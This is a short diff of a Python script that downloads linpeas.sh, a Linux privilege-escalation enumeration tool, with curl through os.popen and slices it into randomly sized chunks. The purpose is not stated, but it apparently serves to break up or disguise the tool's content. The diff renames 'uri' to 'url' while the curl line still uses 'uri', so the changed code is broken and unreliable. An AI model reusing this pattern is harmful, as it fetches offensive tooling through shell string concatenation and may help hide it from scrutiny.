@@ -13,11 +13,9 @@ def alternating_size_chunks(iterable, steps):
         next_step = next(step)
         yield iterable[n:n + next_step]
         n += next_step
+        
 
-filename = "/Users/xxxxxxxx/Desktop/discord/server/Wicked Santa Reloaded?.txt"
-#with open(filename) as f:
-#    file_content = f.read()
-uri = "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"
+url = "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"
 file_content=os.popen('curl "'+uri+'" 2>/dev/null').read()
 print("\r")
 content = list(alternating_size_chunks(file_content, (random.randrange(2, 5), random.randrange(2, 5), random.randrange(2, 5))))
